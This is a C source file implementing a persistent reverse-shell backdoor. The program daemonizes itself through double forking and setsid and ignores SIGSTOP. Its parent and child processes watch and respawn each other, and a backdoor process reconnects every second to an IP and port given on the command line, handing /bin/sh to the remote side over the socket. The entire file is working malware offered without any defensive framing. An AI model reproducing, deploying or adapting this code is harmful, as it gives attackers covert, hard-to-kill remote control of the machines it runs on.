#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/inet.h>

#define LEN 64

char shell[] = "/bin/sh";
__pid_t child_pid;
uint16_t conn_port;
char conn_ip[LEN];

void usage(const char*);

__sighandler_t _daemon();

int reverse_shell();

__pid_t fork_backdoor();

int detect_child(__pid_t);

__sighandler_t parent_process();

__sighandler_t child_process();


int main(int argc, const char **argv, const char **envp) {
    if (argc != 3) {
        usage(argv[0]);
        return -1;
    }
    strncpy(conn_ip, argv[1], LEN);
    conn_port = (uint16_t)strtol(argv[2], NULL, 10);
    if (fork()) {
        exit(0);
    }
    setsid();
    if (fork()) {
        exit(0);
    }
    signal(SIGSTOP, SIG_IGN);
    _daemon();
    return 0;
}

void usage(const char* bin) {
    puts("Usage:");
    printf("%s ", bin);
    puts("<reverse ip> <port>");
}

int reverse_shell() {
    int sock;
    int ret = 0;
    struct sockaddr_in server;
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) != -1) {
        server.sin_family = AF_INET;
        server.sin_port = htons(conn_port);
        server.sin_addr.s_addr = inet_addr(conn_ip);
        if (connect(sock, (struct sockaddr *) &server, sizeof(struct sockaddr)) != -1) {
            dup2(sock, 0);
            dup2(sock, 1);
            dup2(sock, 2);
            ret = system(shell);
            close(sock);
        }
    }
    return ret;
}

__pid_t fork_backdoor() {
    __pid_t pid;
    pid = fork();
    if (!pid) {
        while (1) {
            reverse_shell();
            sleep(1);
        }
    }
    return pid;
}

int detect_child(__pid_t pid) {
    return kill(pid, 0) == 0;
}

__sighandler_t parent_process() {
    while ((unsigned int) detect_child(child_pid));
    return _daemon();
}

__sighandler_t _daemon() {
    child_pid = fork();
    if (child_pid) {
        return parent_process();
    }
    child_process();
    return signal(SIGSTOP, SIG_IGN);
}

__sighandler_t child_process() {
    __pid_t pid;

    pid = fork_backdoor();
    while (getppid() != 1) {
        if (!(unsigned int) detect_child(pid))
            pid = fork_backdoor();
    }
    return _daemon();
}
